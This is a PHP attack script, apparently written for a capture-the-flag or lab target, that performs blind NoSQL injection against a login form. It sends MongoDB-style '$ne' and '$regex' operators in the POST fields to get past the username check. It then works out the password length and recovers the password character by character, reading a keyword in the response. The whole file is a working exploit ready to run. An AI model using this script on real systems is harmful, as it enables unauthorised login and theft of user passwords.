<?php
/*************************************************/
/*************************************************/
/*************************************************/
/**************** Víctor Guerrero ****************/
/************* https://vguerrero.com *************/
/*************************************************/
/*************************************************/

$url = "http://localhost/index.php";
$length=0;
$username='foo';
$passwd = '';
$i = 0;
$char = 32;


while(true){
	$payload = ".{".$length."}";
	$data = [
		'username[$ne]' => $username,
		'password[$regex]' => $payload
	];
	$response = request($url, $data);
	print_r("Working, possible pass length: $length \r\n");
	if(substr_count($response, 'Plantation') == 0){
		break;
	}
	$length++;
}

$length--;
print_r("Pass length: $length\r\n");

while($i < $length){
	$letter = special_chars($char);
	$payload = $passwd.$letter;
	$data = [
		'username[$ne]' => $username,
		'password[$regex]' => '^'.$payload
	];
	print_r("Testing $payload\r\n");
	$response = request($url, $data);
	
	if(substr_count($response, 'Plantation') > 0){
		$passwd .= special_chars($char);
		$char = 32;
		$i++;
		print_r("Password match: $passwd\r\n");
	}

	$char++;
}

print_r("Pass: ".$passwd);

function request($url, $data){
	$options = array(
		'http' => array(
			//'header'  => "Content-type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=45pkrulbu1cvrk8oknoo2e7o2d",
			'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
			'method'  => 'POST',
			'content' => http_build_query($data)
		)
	);

	$context  = stream_context_create($options);
	$response = file_get_contents($url, false, $context);

	return $response;
}

function special_chars(int $char){
	if(
		($char == 36) ||
		($char >= 40 && $char <= 43) ||
		($char >= 46 && $char <= 47) ||
		($char == 63) ||
		($char >= 91 && $char <= 94) ||
		($char == 125)
	){
		return "\\".chr($char);
	}
	return chr($char);
}